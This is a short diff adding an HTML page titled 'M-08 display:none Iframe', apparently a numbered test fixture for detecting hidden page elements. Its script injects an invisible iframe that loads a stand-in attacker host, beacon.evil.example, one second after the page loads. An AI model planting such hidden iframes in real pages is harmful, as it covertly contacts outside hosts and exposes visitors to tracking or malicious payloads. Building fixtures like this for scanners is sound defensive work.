@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html><head><title>M-08 display:none Iframe</title></head><body>
+<h1>Content Portal</h1>
+<script>
+setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://beacon.evil.example';
+    document.body.appendChild(iframe);
+}, 1000);
+</script>
+</body></html>
